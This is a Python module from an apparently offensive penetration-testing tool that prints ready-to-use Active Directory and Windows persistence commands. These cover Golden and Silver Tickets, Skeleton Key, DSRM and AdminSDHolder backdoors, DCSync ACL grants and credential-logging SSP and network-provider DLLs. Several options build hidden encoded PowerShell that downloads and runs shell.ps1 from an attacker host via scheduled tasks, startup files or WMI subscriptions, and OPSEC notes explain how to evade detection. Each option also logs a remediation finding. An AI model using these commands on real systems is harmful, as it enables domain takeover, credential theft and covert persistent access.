"""
Module: Domain & Local Persistence
Techniques: Golden Ticket, Silver Ticket, AdminSDHolder, DSRM Backdoor,
            Skeleton Key, Custom SSP, SID History, ACL on Domain Object,
            Security Descriptor Mod, Constrained Delegation Backdoor,
            Scheduled Task, Registry Run Key, WMI Subscription
"""
from utils.helpers import *
from config.settings import SESSION
import base64

def run():
    print_banner("DOMAIN & LOCAL PERSISTENCE")
    dc      = input_or_session("dc_ip",    "DC IP")
    dom     = input_or_session("domain",   "Domain")
    user    = input_or_session("username", "Username")
    pw      = input_or_session("password", "Password")
    base_dn = "DC=" + dom.replace(".", ",DC=")

    print(f"""
  {C}── DOMAIN PERSISTENCE ───────────────────────────────────────────{RST}
  [1]  Golden Ticket               (krbtgt hash → unlimited TGT)
  [2]  Silver Ticket               (service hash → targeted access)
  [3]  AdminSDHolder Backdoor      (ACL propagation every 60 min)
  [4]  DSRM Backdoor               (local DC admin → remote access)
  [5]  Skeleton Key                (LSASS patch → master password)
  [6]  Custom SSP                  (mimilib → log all credentials)
  [7]  SID History Injection       (hidden DA-level access)
  [8]  ACL on Domain Object        (grant DCSync to controlled user)
  [9]  Security Descriptor Mod     (WMI / PSRemoting backdoor)
  [10] Constrained Delegation Set  (persistent impersonation path)
  {C}── LOCAL PERSISTENCE ─────────────────────────────────────────────{RST}
  [11] Scheduled Task              (SharPersist / schtask)
  [12] Registry Run Key            (HKCU / HKLM run key)
  [13] Startup Folder              (LNK / script drop)
  [14] WMI Event Subscription      (fileless persistence)
  {C}── ADVANCED PERSISTENCE ──────────────────────────────────────────{RST}
  [15] Custom Network Provider     (NPPSPY — credential capture on logon)
  [16] Invoke-SDPropagator         (force AdminSDHolder SDProp manually)
  [17] Temporary Group Membership  (time-limited DA via AD TTL groups)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] Golden Ticket ──────────────────────────────────────────────────────
    if c == "1":
        krbtgt = prompt("krbtgt NTLM hash")
        sid    = prompt("Domain SID (S-1-5-21-...)")
        uid    = prompt("User RID (default=500 for Administrator)") or "500"
        groups = prompt("Extra group RIDs (default=512,518,519,520)") or "512,518,519,520"
        print(f"""
  {C}Golden Ticket — forge TGT for any account (survives password resets):{RST}

  {Y}Linux (impacket):{RST}
  impacket-ticketer \\
    -nthash {krbtgt} \\
    -domain-sid {sid} \\
    -domain {dom} \\
    -user-id {uid} \\
    -groups {groups} \\
    Administrator

  export KRB5CCNAME=Administrator.ccache
  impacket-psexec {dom}/Administrator@{dc} -k -no-pass
  impacket-secretsdump {dom}/Administrator@{dc} -k -no-pass -just-dc-ntlm

  {Y}Windows (Rubeus):{RST}
  .\\Rubeus.exe golden \\
    /rc4:{krbtgt} \\
    /domain:{dom} \\
    /sid:{sid} \\
    /user:Administrator \\
    /id:{uid} /groups:{groups} \\
    /ptt

  {Y}Windows (Mimikatz):{RST}
  kerberos::golden /user:Administrator /domain:{dom} \\
    /sid:{sid} /krbtgt:{krbtgt} /id:{uid} /groups:{groups} /ptt

  {DIM}⚠ Ticket valid 10 years by default — survives krbtgt password reset once!
  Rotate krbtgt TWICE to invalidate all golden tickets.{RST}
""")
        add_finding("Golden Ticket Persistence", "Critical",
                    f"Golden Ticket forged using krbtgt hash — persistent DA access for 10 years",
                    "Rotate krbtgt password TWICE (48h apart); monitor TGTs with unusual lifetimes (Event ID 4769); enable Kerberos logging")

    # ── [2] Silver Ticket ──────────────────────────────────────────────────────
    elif c == "2":
        svc_hash = prompt("Service account NTLM hash")
        sid      = prompt("Domain SID (S-1-5-21-...)")
        spn      = prompt("Target SPN (e.g. cifs/server.corp.local)")
        target   = prompt("Impersonate user (e.g. Administrator)")
        print(f"""
  {C}Silver Ticket — forge TGS for specific service (no DC contact needed):{RST}

  {Y}Linux (impacket):{RST}
  impacket-ticketer \\
    -nthash {svc_hash} \\
    -domain-sid {sid} \\
    -domain {dom} \\
    -spn {spn} \\
    {target}

  export KRB5CCNAME={target}.ccache
  impacket-psexec {dom}/{target}@{dc} -k -no-pass

  {Y}Windows (Mimikatz):{RST}
  kerberos::golden /user:{target} /domain:{dom} \\
    /sid:{sid} /rc4:{svc_hash} /target:{spn.split("/")[1]} \\
    /service:{spn.split("/")[0]} /ptt

  {Y}Windows (Rubeus):{RST}
  .\\Rubeus.exe silver \\
    /rc4:{svc_hash} /domain:{dom} /sid:{sid} \\
    /user:{target} /service:{spn} /ptt

  {DIM}Silver Ticket targets a specific service — stealthier than Golden Ticket
  No DC contact during auth = bypasses many detections{RST}
""")
        add_finding("Silver Ticket Persistence", "High",
                    f"Silver Ticket forged for {spn} impersonating {target}",
                    "Monitor Kerberos tickets without corresponding TGT requests; enforce PAC validation")

    # ── [3] AdminSDHolder ──────────────────────────────────────────────────────
    elif c == "3":
        backdoor = prompt("Controlled user to add to AdminSDHolder ACL")
        print(f"""
  {C}AdminSDHolder ACL Backdoor — SDProp propagates every 60 min:{RST}

  {Y}Protected objects (SDProp targets):{RST}
  Domain Admins, Enterprise Admins, Schema Admins, Administrators,
  Account Operators, Backup Operators, Print Operators, Server Operators

  {Y}Step 1 — Grant GenericAll on AdminSDHolder:{RST}
  # impacket dacledit (Linux)
  impacket-dacledit \\
    -action write -rights FullControl \\
    -principal '{backdoor}' \\
    -target-dn 'CN=AdminSDHolder,CN=System,{base_dn}' \\
    {dom}/{user}:'{pw}' -dc-ip {dc}

  # PowerView (Windows)
  Add-DomainObjectAcl \\
    -TargetIdentity 'CN=AdminSDHolder,CN=System,{base_dn}' \\
    -PrincipalIdentity '{backdoor}' -Rights All -Verbose

  {Y}Step 2 — Force immediate SDProp run (no need to wait 60 min):{RST}
  Invoke-ADSDPropagation    # PowerView

  {Y}Step 3 — Verify propagation to Domain Admins:{RST}
  Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | \\
    Where-Object {{$_.SecurityIdentifier -match \\
      (Get-DomainUser '{backdoor}').objectsid}}

  {Y}Step 4 — Abuse (e.g. reset DA password):{RST}
  Set-DomainUserPassword -Identity 'Administrator' \\
    -AccountPassword (ConvertTo-SecureString 'NewP@ss!' -AsPlainText -Force)
""")
        add_finding("AdminSDHolder ACL Backdoor", "Critical",
                    f"GenericAll granted to '{backdoor}' on AdminSDHolder — ACL auto-propagates to all protected groups",
                    "Audit AdminSDHolder ACLs; monitor Event ID 4670; alert on ACE additions to CN=AdminSDHolder")

    # ── [4] DSRM Backdoor ──────────────────────────────────────────────────────
    elif c == "4":
        print(f"""
  {C}DSRM Backdoor — enable remote auth with local DC admin hash:{RST}

  {Y}Step 1 — Dump DSRM (local Administrator) hash from DC:{RST}
  # Mimikatz on DC (DA required):
  Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' \\
    -ComputerName {dc}

  # impacket (Linux):
  impacket-secretsdump {dom}/{user}:'{pw}'@{dc} -sam

  {Y}Step 2 — Enable network logon with DSRM hash (run on DC as DA):{RST}
  New-ItemProperty \\
    "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" \\
    -Name "DsrmAdminLogonBehavior" -Value 2 \\
    -PropertyType DWORD -Force

  # Via CME (remote):
  crackmapexec smb {dc} -u '{user}' -p '{pw}' -x \\
    "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f"

  {Y}Step 3 — Persistent access with DSRM hash (survives ALL DA resets):{RST}
  impacket-secretsdump '{dom}/Administrator@{dc}' -hashes :<dsrm_hash> -just-dc-ntlm
  impacket-psexec '{dom}/Administrator@{dc}' -hashes :<dsrm_hash>
  evil-winrm -i {dc} -u Administrator -H <dsrm_hash>

  {DIM}⚠ This backdoor survives Domain Admin password resets!
  Persists until DsrmAdminLogonBehavior is set back to 0.{RST}
""")
        add_finding("DSRM Backdoor", "Critical",
                    f"DsrmAdminLogonBehavior=2 set on {dc} — DSRM hash usable for persistent remote auth",
                    "Set DsrmAdminLogonBehavior=0 on all DCs; rotate DSRM password regularly; monitor Lsa registry key changes")

    # ── [5] Skeleton Key ───────────────────────────────────────────────────────
    elif c == "5":
        print(f"""
  {C}Skeleton Key — patch LSASS: universal password for ALL accounts:{RST}

  {Y}Step 1 — Inject Skeleton Key (DA required, executed on DC):{RST}
  Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' \\
    -ComputerName {dc}

  {Y}Step 2 — After injection, ALL domain accounts accept "mimikatz":{RST}
  crackmapexec smb {dc} -u 'Administrator' -p 'mimikatz' -d {dom}
  crackmapexec smb {dc} -u '{user}' -p 'mimikatz' -d {dom}
  Enter-PSSession -ComputerName {dc} \\
    -Credential {dom}\\administrator   # password: mimikatz

  {Y}Step 3 — Verify injection worked:{RST}
  Invoke-Mimikatz -Command '"misc::skeleton"' -ComputerName {dc}

  {R}⚠ WARNING:{RST}
  - Only lasts until DC is REBOOTED
  - Injects into LSASS — may crash on some EDR-protected DCs
  - For persistent access → combine with Golden Ticket or DSRM

  {Y}For a more stable in-memory variant:{RST}
  Invoke-MimikatzWDigest.ps1 -Command '"misc::skeleton"' -Target {dc}
""")
        add_finding("Skeleton Key Injection", "Critical",
                    f"LSASS patched on {dc} via misc::skeleton — universal password 'mimikatz' active for all accounts",
                    "Monitor LSASS modifications; detect misc::skeleton via EDR/AV; enable RunAsPPL LSA protection; monitor Event ID 4611")

    # ── [6] Custom SSP ─────────────────────────────────────────────────────────
    elif c == "6":
        print(f"""
  {C}Custom SSP (mimilib) — log all credentials to disk:{RST}

  {Y}Method 1 — In-memory injection (no file drop, no reboot needed):{RST}
  Invoke-Mimikatz -Command '"misc::memssp"' -ComputerName {dc}
  # Credentials logged to: C:\\Windows\\System32\\mimilsa.log

  {Y}Method 2 — Persistent registry-based SSP (survives reboot):{RST}

  Step 1: Drop mimilib.dll to C:\\Windows\\System32\\ on DC (DA required)
  Step 2: Register SSP package:

  $packages = Get-ItemProperty \\
    HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig \\
    -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
  $packages += "mimilib"
  Set-ItemProperty \\
    HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig \\
    -Name 'Security Packages' -Value $packages
  Set-ItemProperty \\
    HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa \\
    -Name 'Security Packages' -Value $packages

  {Y}Step 3 — After next reboot, credentials log to:{RST}
  C:\\Windows\\System32\\kiwissp.log

  {Y}Step 4 — Collect logs remotely:{RST}
  crackmapexec smb {dc} -u '{user}' -p '{pw}' \\
    -x "type C:\\Windows\\System32\\kiwissp.log"
  crackmapexec smb {dc} -u '{user}' -p '{pw}' \\
    -x "type C:\\Windows\\System32\\mimilsa.log"
""")
        add_finding("Custom SSP (mimilib)", "Critical",
                    f"mimilib.dll registered as Security Support Provider on {dc} — all plaintext creds logged",
                    "Monitor Security Packages registry key changes; audit mimilib.dll in System32; enable Credential Guard; monitor Event ID 4614")

    # ── [7] SID History ────────────────────────────────────────────────────────
    elif c == "7":
        target_user = prompt("User to inject SID history into (your controlled account)")
        da_sid      = prompt("Target SID to inject (e.g. Domain Admins SID: S-1-5-21-...-512)")
        print(f"""
  {C}SID History Injection — hidden DA-level access:{RST}

  {Y}Step 1 — Inject SID history (DA on source domain required):{RST}
  # Mimikatz (must run on DC):
  Invoke-Mimikatz -Command \\
    '"privilege::debug" "misc::addsid /sam:{target_user} /sid:{da_sid}"' \\
    -ComputerName {dc}

  {Y}Step 2 — Verify SID history was injected:{RST}
  # PowerView
  Get-DomainUser '{target_user}' | select -Expand sidhistory

  # LDAP (Linux)
  ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' \\
    -b '{base_dn}' '(sAMAccountName={target_user})' sIDHistory

  {Y}Step 3 — Abuse (authenticate as {target_user}, auto-inherit DA rights):{RST}
  crackmapexec smb {dc} -u '{target_user}' -p '<password>' -d {dom}
  impacket-secretsdump {dom}/{target_user}:<password>@{dc} -just-dc-ntlm

  {DIM}SID History grants access via PAC — survives password resets of DA accounts.
  Often missed by monitoring tools as the user "looks" normal.{RST}
""")
        add_finding("SID History Injection", "Critical",
                    f"Domain Admin SID injected into sIDHistory of '{target_user}' — hidden DA-level access",
                    "Audit sIDHistory attribute; filter SID history in PAC validation; monitor Event ID 4765/4766")

    # ── [8] ACL on Domain Object ───────────────────────────────────────────────
    elif c == "8":
        target_user = prompt("User to grant DCSync rights (your controlled user)")
        run_cmd(
            f"{imp('dacledit.py')} -action write -rights DCSync "
            f"-principal '{target_user}' "
            f"-target-dn '{base_dn}' "
            f"{dom}/{user}:'{pw}' -dc-ip {dc}"
        )
        info("DCSync rights granted. Run DCSync:")
        run_cmd(f"{imp('secretsdump.py')} {dom}/{target_user}:'{pw}'@{dc} -just-dc-ntlm")
        add_finding("DCSync ACL Backdoor", "Critical",
                    f"DS-Replication rights granted to '{target_user}' on domain NC head",
                    "Audit DS-Replication-Get-Changes ACEs; monitor DACL changes on domain NC head (Event ID 5136)")

    # ── [9] Security Descriptor Mod ────────────────────────────────────────────
    elif c == "9":
        backdoor = prompt("Controlled user to grant WMI/PSRemoting access")
        print(f"""
  {C}Security Descriptor Modification — WMI & PSRemoting backdoor:{RST}

  {Y}WMI Namespace Backdoor:{RST}
  # Grant WMI access to specific user (PowerView)
  Set-RemoteWMI -Username '{backdoor}' -ComputerName {dc} \\
    -Namespace 'root\\cimv2' -Verbose

  # Verify access (as backdoor user):
  Get-WmiObject -Class win32_operatingsystem \\
    -ComputerName {dc} -Credential {dom}\\{backdoor}

  {Y}PSRemoting / WinRM Backdoor:{RST}
  Set-RemotePSRemoting -Username '{backdoor}' \\
    -ComputerName {dc} -Verbose

  # Verify:
  Invoke-Command -ComputerName {dc} \\
    -ScriptBlock {{whoami}} -Credential {dom}\\{backdoor}

  {Y}Cleanup:{RST}
  Set-RemoteWMI -Username '{backdoor}' -ComputerName {dc} -Remove
  Set-RemotePSRemoting -Username '{backdoor}' -ComputerName {dc} -Remove
""")
        add_finding("WMI/PSRemoting SD Backdoor", "High",
                    f"Security descriptor modified — '{backdoor}' granted WMI/PSRemoting on {dc}",
                    "Monitor WMI namespace ACL changes; audit PSSessionConfiguration; restrict WinRM access")

    # ── [10] Constrained Delegation Set ────────────────────────────────────────
    elif c == "10":
        svc_user = prompt("Service account to set delegation on")
        spn      = prompt("Delegation target SPN (e.g. cifs/DC01.corp.local)")
        print(f"""
  {C}Set Constrained Delegation — persistent impersonation path:{RST}

  {Y}Requirement: GenericAll/GenericWrite on target account{RST}

  {Y}Step 1 — Set msDS-AllowedToDelegateTo + TrustedToAuthForDelegation:{RST}
  # PowerView
  Set-DomainObject -Identity '{svc_user}' \\
    -Set @{{'msds-allowedtodelegateto'='{spn}'}} -Verbose
  Set-DomainObject -Identity '{svc_user}' \\
    -XOR @{{useraccountcontrol=16777216}} -Verbose

  {Y}Step 2 — Exploit via S4U2Proxy (impersonate Administrator):{RST}
  impacket-getST \\
    -spn {spn} \\
    -impersonate Administrator \\
    {dom}/{svc_user}:'{pw}' -dc-ip {dc}

  export KRB5CCNAME=Administrator@{spn.replace("/","_")}.ccache
  impacket-psexec {dom}/Administrator@{dc} -k -no-pass
""")
        add_finding("Constrained Delegation Backdoor", "Critical",
                    f"msDS-AllowedToDelegateTo set on '{svc_user}' → {spn} — persistent impersonation",
                    "Monitor msDS-AllowedToDelegateTo attribute changes; restrict GenericWrite ACLs; audit delegation settings")

    # ── [11] Scheduled Task ────────────────────────────────────────────────────
    elif c == "11":
        attacker  = prompt("Attacker IP")
        task_name = prompt("Task name") or "WindowsUpdater"
        raw_cmd   = f'IEX ((new-object net.webclient).downloadstring("http://{attacker}/shell.ps1"))'
        b64       = base64.b64encode(raw_cmd.encode('utf-16-le')).decode()
        print(f"""
  {C}Scheduled Task Persistence:{RST}

  {Y}SharPersist (Windows):{RST}
  .\\SharPersist.exe -t schtask \\
    -c "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" \\
    -a "-nop -w hidden -enc {b64}" \\
    -n "{task_name}" -m add -o hourly

  {Y}Native (schtasks):{RST}
  schtasks /create /tn "{task_name}" /tr \\
    "powershell -nop -w hidden -enc {b64}" \\
    /sc hourly /ru SYSTEM /f

  {Y}Remote via CME:{RST}
  crackmapexec smb {dc} -u '{user}' -p '{pw}' \\
    -x 'schtasks /create /tn "{task_name}" /tr "powershell -nop -w hidden -enc {b64}" /sc hourly /ru SYSTEM /f'

  {Y}Verify:{RST}
  schtasks /query /tn "{task_name}" /fo list
""")
        add_finding("Scheduled Task Persistence", "High",
                    f"Persistent schtask '{task_name}' → callback to {attacker}",
                    "Audit scheduled tasks (Event ID 4698); monitor new SYSTEM-run tasks; use autoruns")

    # ── [12] Registry Run Key ──────────────────────────────────────────────────
    elif c == "12":
        exe_path  = prompt("Backdoor EXE path (e.g. C:\\ProgramData\\update.exe)")
        key_name  = prompt("Registry value name") or "WindowsUpdater"
        key_hive  = prompt("Hive [hkcu/hklm]") or "hkcu"
        hive_path = {
            "hkcu": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "hklm": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        }.get(key_hive, "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
        print(f"""
  {C}Registry Run Key Persistence:{RST}

  {Y}SharPersist (Windows):{RST}
  .\\SharPersist.exe -t reg \\
    -c "{exe_path}" -a "/q /n" \\
    -k "{key_hive}run" -v "{key_name}" -m add

  {Y}Native (reg.exe):{RST}
  reg add {hive_path} \\
    /v "{key_name}" /t REG_SZ /d "{exe_path}" /f

  {Y}Remote via CME:{RST}
  crackmapexec smb {dc} -u '{user}' -p '{pw}' \\
    -x 'reg add {hive_path} /v "{key_name}" /t REG_SZ /d "{exe_path}" /f'

  {Y}Verify:{RST}
  reg query {hive_path}
""")
        add_finding("Registry Run Key Persistence", "High",
                    f"Run key '{key_name}' → {exe_path} in {hive_path}",
                    "Monitor Run/RunOnce registry keys; use autoruns; audit Event ID 4657")

    # ── [13] Startup Folder ────────────────────────────────────────────────────
    elif c == "13":
        attacker   = prompt("Attacker IP")
        file_name  = prompt("Script/LNK filename") or "UserEnvSetup"
        raw_cmd    = f'IEX ((new-object net.webclient).downloadstring("http://{attacker}/shell.ps1"))'
        b64        = base64.b64encode(raw_cmd.encode('utf-16-le')).decode()
        print(f"""
  {C}Startup Folder Persistence:{RST}

  {Y}SharPersist (Windows):{RST}
  .\\SharPersist.exe -t startupfolder \\
    -c "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" \\
    -a "-nop -w hidden -enc {b64}" \\
    -f "{file_name}" -m add

  {Y}Startup folder locations:{RST}
  # Current user:
  C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\

  # All users (requires admin):
  C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\

  {Y}Drop script directly:{RST}
  echo powershell -nop -w hidden -enc {b64} > \\
    "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{file_name}.bat"
""")
        add_finding("Startup Folder Persistence", "Medium",
                    f"Startup script '{file_name}' → callback to {attacker}",
                    "Monitor Startup folder for new files; audit user profile directories")

    # ── [14] WMI Event Subscription ────────────────────────────────────────────
    elif c == "14":
        attacker = prompt("Attacker IP")
        sub_name = prompt("Subscription name") or "WindowsUpdate"
        raw_cmd  = f'powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString(\'http://{attacker}/shell.ps1\'))'
        print(f"""
  {C}WMI Event Subscription — fileless persistence (survives reboots):{RST}

  {Y}PowerShell (run on target as admin):{RST}
  $FilterArgs = @{{
    EventNameSpace = 'root\\cimv2'
    Name           = '{sub_name}Filter'
    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60"
    QueryLanguage  = 'WQL'
  }}
  $Filter = New-CimInstance -Namespace root/subscription \\
    -ClassName '__EventFilter' -Property $FilterArgs

  $ConsumerArgs = @{{
    Name             = '{sub_name}Consumer'
    CommandLineTemplate = '{raw_cmd}'
  }}
  $Consumer = New-CimInstance -Namespace root/subscription \\
    -ClassName 'CommandLineEventConsumer' -Property $ConsumerArgs

  New-CimInstance -Namespace root/subscription \\
    -ClassName '__FilterToConsumerBinding' \\
    -Property @{{Filter=$Filter; Consumer=$Consumer}}

  {Y}Verify:{RST}
  Get-CimInstance -Namespace root/subscription -ClassName '__EventFilter'
  Get-CimInstance -Namespace root/subscription -ClassName 'CommandLineEventConsumer'

  {Y}Cleanup:{RST}
  Get-CimInstance -Namespace root/subscription -ClassName '__EventFilter' | \\
    Where-Object {{$_.Name -eq '{sub_name}Filter'}} | Remove-CimInstance
  Get-CimInstance -Namespace root/subscription -ClassName 'CommandLineEventConsumer' | \\
    Where-Object {{$_.Name -eq '{sub_name}Consumer'}} | Remove-CimInstance

  {Y}Remote via CME (PowerSploit):{RST}
  crackmapexec smb {dc} -u '{user}' -p '{pw}' \\
    -M invoke_wmi_event_sub -o ACTION=SET NAME={sub_name}
""")
        add_finding("WMI Event Subscription Persistence", "Critical",
                    f"WMI subscription '{sub_name}' → fileless callback to {attacker} every 60 seconds",
                    "Monitor WMI subscriptions (Event ID 5857, 5860, 5861); use Get-WMIObject __EventFilter regularly; audit root\\subscription namespace")

    # ── [15] Custom Network Provider (NPPSPY) ────────────────────────────────
    elif c == "15":
        print(f"""
  {C}Custom Network Provider (NPPSPY / KrbAuth.dll) — Credential Capture on Logon:{RST}

  {DIM}Network Providers are DLLs that Windows loads during logon to authenticate
  network credentials. A malicious NP DLL receives plaintext credentials for
  every interactive logon — highly persistent and rarely detected.{RST}

  ── Method 1: NPPSPY (C# implementation) ────────────────────────────────
  {Y}Step 1 — Build NPPSPY.dll (or use precompiled):{RST}
  git clone https://github.com/gtworek/PSBits
  cd PSBits\\NPPSPY
  # Compile: produces NPPSPY.dll (x64)

  {Y}Step 2 — Copy DLL to System32 on target (DA required):{RST}
  copy NPPSPY.dll \\\\{dc}\\C$\\Windows\\System32\\NPPSPY.dll

  {Y}Step 3 — Register DLL as Network Provider:{RST}
  # On DC (or via remote registry):
  $regPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSPY'
  New-Item -Path $regPath -Force
  Set-ItemProperty -Path $regPath -Name 'Description'   -Value 'NPPSPY'
  Set-ItemProperty -Path $regPath -Name 'DisplayName'   -Value 'NPPSPY'
  Set-ItemProperty -Path $regPath -Name 'ImagePath'     -Value 'C:\\Windows\\System32\\NPPSPY.dll'
  Set-ItemProperty -Path $regPath -Name 'Type'          -Value 18 -Type DWord
  New-ItemProperty -Path $regPath\\NetworkProvider \\
    -Name 'Class' -Value 2 -Type DWord -Force
  New-ItemProperty -Path $regPath\\NetworkProvider \\
    -Name 'Name'  -Value 'NPPSPY' -Force

  {Y}Step 4 — Add to ProviderOrder (append to existing list):{RST}
  $np = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order'
  $order = (Get-ItemProperty $np).ProviderOrder
  Set-ItemProperty $np -Name ProviderOrder -Value "$order,NPPSPY"

  {Y}Step 5 — Reboot (or trigger logon) to activate:{RST}
  # After next interactive logon, credentials are written to:
  C:\\Windows\\Temp\\NPPSPY.txt   # (default log path in NPPSPY source)

  {Y}Step 6 — Collect credentials:{RST}
  crackmapexec smb {dc} -u '{user}' -p '{pw}' \\
    -x "type C:\\Windows\\Temp\\NPPSPY.txt"

  ── Method 2: KrbAuth.dll (custom Kerberos provider) ──────────────────────
  {Y}Logs credentials via Kerberos authentication path — catches domain logons:{RST}
  # Same registration process — replace DLL path with KrbAuth.dll
  # Credentials logged to: C:\\Windows\\System32\\krbauth.log

  {NEON_YEL}OPSEC note:{RST} {DIM}
  • Requires reboot or new logon session to activate
  • Survives reboots — DLL loads at every boot
  • Logs ALL interactive domain logons (RDP, console, RunAs)
  • Extremely stealthy — no process creation, no scheduled tasks
  • Detection: audit ProviderOrder registry key; monitor System32 for new DLLs{RST}
""")
        add_finding("Custom Network Provider (NPPSPY)", "Critical",
                    f"Malicious Network Provider DLL registered on {dc} — plaintext credential capture on every logon",
                    "Audit HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\NetworkProvider\\\\Order; monitor System32 DLL drops; use Credential Guard")

    # ── [16] Invoke-SDPropagator ──────────────────────────────────────────────
    elif c == "16":
        backdoor = prompt("User you added to AdminSDHolder ACL (to verify propagation)")
        print(f"""
  {C}Invoke-SDPropagator — Force AdminSDHolder SDProp Manually:{RST}

  {DIM}Normally the SDProp process runs every 60 minutes and copies the
  AdminSDHolder ACL to all protected groups (Domain Admins, etc.).
  Invoke-SDPropagator triggers it immediately — no need to wait.{RST}

  ── Trigger SDProp immediately ────────────────────────────────────────────
  {Y}Method 1 — PowerView (Invoke-SDPropagator):{RST}
  Invoke-SDPropagator -ShowProgress -Verbose

  {Y}Method 2 — AD Module (via taskScheduler):{RST}
  $s = New-PSSession -ComputerName {dc}
  Invoke-Command -Session $s -ScriptBlock {{
    $task = Get-ScheduledTask -TaskName "SDProp" -ErrorAction SilentlyContinue
    if ($task) {{ Start-ScheduledTask -TaskName "SDProp" }}
    else {{
      # Trigger via LDAP rootDSE modification (works on all DCs):
      $root = [ADSI]"LDAP://{dc}/RootDSE"
      $root.Put("fixupInheritance", 1)
      $root.SetInfo()
    }}
  }}

  {Y}Method 3 — LDAP rootDSE fixupInheritance (most reliable):{RST}
  $root = [ADSI]"LDAP://{dc}/RootDSE"
  $root.Put("fixupInheritance", 1)
  $root.SetInfo()

  ── Verify propagation ────────────────────────────────────────────────────
  {Y}Check ACL on Domain Admins group:{RST}
  Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | \\
    Where-Object {{
      $_.SecurityIdentifier -match \\
        (Get-DomainUser '{backdoor or "<backdoor_user>"}').objectsid
    }}

  {Y}Confirm your user has GenericAll/Full Control on DA group:{RST}
  (Get-Acl "AD:\\CN=Domain Admins,CN=Users,{base_dn}").Access | \\
    Where-Object {{$_.IdentityReference -like "*{backdoor or "<user>"}*"}}

  ── Now abuse propagated rights ───────────────────────────────────────────
  {Y}Reset DA password (as backdoor user):{RST}
  Set-DomainUserPassword -Identity 'Administrator' \\
    -AccountPassword (ConvertTo-SecureString 'NewP@ss1!' -AsPlainText -Force) \\
    -Credential (Get-Credential {dom}\\{backdoor or "<backdoor_user>"})

  {Y}Add yourself to Domain Admins:{RST}
  Add-DomainGroupMember -Identity 'Domain Admins' \\
    -Members '{backdoor or "<backdoor_user>"}' \\
    -Credential (Get-Credential {dom}\\{backdoor or "<backdoor_user>"})

  {NEON_YEL}OPSEC:{RST} {DIM}Forcing SDProp generates no unique event — it blends with the normal
  scheduled propagation. Triggered via rootDSE is the stealthiest method.{RST}
""")
        add_finding("AdminSDHolder + Forced SDProp", "Critical",
                    f"SDProp forced via rootDSE fixupInheritance — ACL from AdminSDHolder propagated to all protected groups immediately",
                    "Monitor rootDSE fixupInheritance writes; audit AdminSDHolder ACL changes; alert on Event ID 5136 for AdminSDHolder container")

    # ── [17] Temporary Group Membership ──────────────────────────────────────
    elif c == "17":
        target_group = prompt("Group to join temporarily [Domain Admins]") or "Domain Admins"
        member_user  = prompt("User to add")
        ttl_minutes  = prompt("TTL in minutes [60]") or "60"
        print(f"""
  {C}Temporary Group Membership — Time-Limited Privileged Access:{RST}

  {DIM}Active Directory supports Privileged Access Management (PAM) which allows
  adding group members with a TTL (Time-to-Live). The membership auto-expires.
  Useful for OPSEC: access is valid only for a window, then self-cleans.{RST}

  ── Requirement: AD Recycle Bin + PAM feature enabled ─────────────────────
  {Y}Check if PAM is enabled:{RST}
  Get-ADOptionalFeature -Filter * | Where-Object {{$_.Name -like "*Priv*"}}

  {Y}Enable PAM (requires Forest Functional Level 2016+, Schema Admin):{RST}
  Enable-ADOptionalFeature 'Privileged Access Management Feature' \\
    -Scope ForestOrConfigurationSet -Target {dom}

  ── Add {member_user} to {target_group} for {ttl_minutes} minutes ────────────────
  {Y}PowerShell AD Module:{RST}
  Add-ADGroupMember \\
    -Identity '{target_group}' \\
    -Members '{member_user}' \\
    -MemberTimeToLive (New-TimeSpan -Minutes {ttl_minutes})

  {Y}Verify TTL-based membership:{RST}
  Get-ADGroup '{target_group}' -Property member -ShowMemberTimeToLive | \\
    Select-Object -ExpandProperty member

  # Output shows: <TTL=3600>CN=user,DC=...  ← TTL in seconds

  ── Abuse during the window ───────────────────────────────────────────────
  {Y}Use elevated access while membership is valid:{RST}
  # Option 1 — enter DA session
  Enter-PSSession -ComputerName {dc} -Credential {dom}\\{member_user}

  # Option 2 — DCSync during window
  impacket-secretsdump {dom}/{member_user}:'<password>'@{dc} -just-dc-ntlm

  # Option 3 — dump credentials and persist via other means
  # (establish persistence before TTL expires!)

  {Y}Verify membership expired:{RST}
  Get-ADGroupMember -Identity '{target_group}' | Where-Object {{$_.Name -eq '{member_user}'}}
  # Should return nothing after {ttl_minutes} minutes

  {NEON_YEL}OPSEC note:{RST} {DIM}
  • Temporary membership still generates Event ID 4728 (member added) and 4729 (removed)
  • However — the auto-removal looks like a scheduled cleanup, not an attacker action
  • Defenders may not correlate the short-lived membership with an attack
  • Best used during a specific operation window; don't rely on it for persistence{RST}
""")
        add_finding("Temporary Group Membership", "High",
                    f"'{member_user}' added to '{target_group}' with {ttl_minutes}-min TTL via PAM feature",
                    "Monitor Event ID 4728/4729 with short membership windows; audit PAM feature usage; alert on TTL-based group additions")

    pause()
